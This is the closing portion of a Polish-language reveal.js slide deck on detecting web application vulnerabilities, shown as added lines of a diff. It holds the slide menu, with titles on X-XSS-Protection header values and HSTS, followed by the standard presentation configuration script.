class="slide-menu-item-title">X-XSS-Protection: 0</span></li><li class="slide-menu-item-vertical future" data-item="156" data-slide-h="33" data-slide-v="7" data-node-uid="333"><span class="slide-menu-item-title">X-XSS-Protection: 1</span></li><li class="slide-menu-item-vertical future" data-item="157" data-slide-h="33" data-slide-v="8" data-node-uid="334"><span class="slide-menu-item-title">X-XSS-Protection: 1; mode=block</span></li><li class="slide-menu-item-vertical future" data-item="158" data-slide-h="33" data-slide-v="9" data-node-uid="335"><span class="slide-menu-item-title">X-XSS-Protection: 1; report=<reporting-uri></reporting-uri></span></li><li class="slide-menu-item-vertical future" data-item="159" data-slide-h="33" data-slide-v="10" data-node-uid="336"><span class="slide-menu-item-title">Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (I)</span></li><li class="slide-menu-item-vertical future" data-item="160" data-slide-h="33" data-slide-v="11" data-node-uid="337"><span class="slide-menu-item-title">Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (II)</span></li><li class="slide-menu-item-vertical future" data-item="161" data-slide-h="33" data-slide-v="12" data-node-uid="338"><span class="slide-menu-item-title">Jaka wartość X-XSS-Protection jest najbezpieczniejsza? (III)</span></li><li class="slide-menu-item-vertical future" data-item="162" data-slide-h="33" data-slide-v="13" data-node-uid="339"><span class="slide-menu-item-title">X-XSS-Protection (III)</span></li><li class="slide-menu-item-vertical future" data-item="163" data-slide-h="33" data-slide-v="14" data-node-uid="340"><span class="slide-menu-item-title">X-XSS-Protection (IV)</span></li><li class="slide-menu-item-vertical future" data-item="164" data-slide-h="33" data-slide-v="15" data-node-uid="341"><span class="slide-menu-item-title">HTTP Strict Transport Security (HSTS)</span></li><li class="slide-menu-item future" data-item="165" data-slide-h="34" data-slide-v="0" data-node-uid="342"><span class="slide-menu-item-title">Ćwiczenie 14</span></li><li class="slide-menu-item future" data-item="166" data-slide-h="35" data-slide-v="0" data-node-uid="343"><span class="slide-menu-item-title">Podsumowanie</span></li><li class="slide-menu-item-vertical future" data-item="167" data-slide-h="35" data-slide-v="1" data-node-uid="344"><span class="slide-menu-item-title">Podsumowanie (I)</span></li><li class="slide-menu-item-vertical future" data-item="168" data-slide-h="35" data-slide-v="2" data-node-uid="345"><span class="slide-menu-item-title">Podsumowanie (II)</span></li><li class="slide-menu-item-vertical future" data-item="169" data-slide-h="35" data-slide-v="3" data-node-uid="346"><span class="slide-menu-item-title">Podsumowanie (III)</span></li><li class="slide-menu-item future" data-item="170" data-slide-h="36" data-slide-v="0" data-node-uid="347"><span class="slide-menu-item-title">Dziękuję za uwagę</span></li><li class="slide-menu-item future" data-item="171" data-slide-h="37" data-slide-v="0" data-node-uid="348"><span class="slide-menu-item-title">Organizacyjne</span></li><li class="slide-menu-item-vertical future" data-item="172" data-slide-h="37" data-slide-v="1" data-node-uid="349"><span class="slide-menu-item-title">Organizacyjne (I)</span></li><li class="slide-menu-item-vertical future" data-item="173" data-slide-h="37" data-slide-v="2" data-node-uid="350"><span class="slide-menu-item-title">Organizacyjne (II)</span></li><li class="slide-menu-item-vertical future" data-item="174" data-slide-h="37" data-slide-v="3" data-node-uid="351"><span class="slide-menu-item-title">Organizacyjne (III)</span></li><li class="slide-menu-item-vertical future" data-item="175" data-slide-h="37" data-slide-v="4" data-node-uid="352"><span class="slide-menu-item-title">Organizacyjne (IV)</span></li></ul></div><div data-panel="Themes" class="slide-menu-panel"><ul class="slide-menu-items"><li class="slide-menu-item future" data-theme="css/theme/black.css" data-item="1" data-node-uid="353">Black</li><li class="slide-menu-item future" data-theme="css/theme/white.css" data-item="2" data-node-uid="354">White</li><li class="slide-menu-item future" data-theme="css/theme/league.css" data-item="3" data-node-uid="355">League</li><li class="slide-menu-item future" data-theme="css/theme/sky.css" data-item="4" data-node-uid="356">Sky</li><li class="slide-menu-item future" data-theme="css/theme/beige.css" data-item="5" data-node-uid="357">Beige</li><li class="slide-menu-item future" data-theme="css/theme/simple.css" data-item="6" data-node-uid="358">Simple</li><li class="slide-menu-item future" data-theme="css/theme/serif.css" data-item="7" data-node-uid="359">Serif</li><li class="slide-menu-item future" data-theme="css/theme/blood.css" data-item="8" data-node-uid="360">Blood</li><li class="slide-menu-item future" data-theme="css/theme/night.css" data-item="9" data-node-uid="361">Night</li><li class="slide-menu-item future" data-theme="css/theme/moon.css" data-item="10" data-node-uid="362">Moon</li><li class="slide-menu-item future" data-theme="css/theme/solarized.css" data-item="11" data-node-uid="363">Solarized</li></ul></div><div data-panel="Transitions" class="slide-menu-panel"><ul class="slide-menu-items"><li class="slide-menu-item future" data-transition="none" data-item="1" data-node-uid="364">None</li><li class="slide-menu-item future" data-transition="fade" data-item="2" data-node-uid="365">Fade</li><li class="slide-menu-item future" data-transition="slide" data-item="3" data-node-uid="366">Slide</li><li class="slide-menu-item future" data-transition="convex" data-item="4" data-node-uid="367">Convex</li><li class="slide-menu-item future" data-transition="concave" data-item="5" data-node-uid="368">Concave</li><li class="slide-menu-item future" data-transition="zoom" data-item="6" data-node-uid="369">Zoom</li><li class="slide-menu-item future" data-transition="cube" data-item="7" data-node-uid="370">Cube</li><li class="slide-menu-item future" data-transition="page" data-item="8" data-node-uid="371">Page</li></ul></div></nav><div class="slide-menu-overlay"></div><div class="slide-menu-button"><a href="#"><i class="fa fa-bars"></i></a></div></div>
+
+		<script src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/head.js"></script>
+		<script src="Praktyczne%20sposoby%20wykrywania%20podatno%C5%9Bci%20w%20aplikacjach%20webowych_files/reveal.js"></script>
+
+		<script>
+
+			// More info https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+				// More info https://github.com/hakimel/reveal.js#dependencies
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/search/search.js', async: true },
+					{ src: 'plugin/zoom-js/zoom.js', async: true },
+					{ src: 'plugin/menu/menu.js'},
+					{ src: 'plugin/notes/notes.js', async: true }
+				]
+			});
+
+		</script>
+
+	
+
+</body></html>
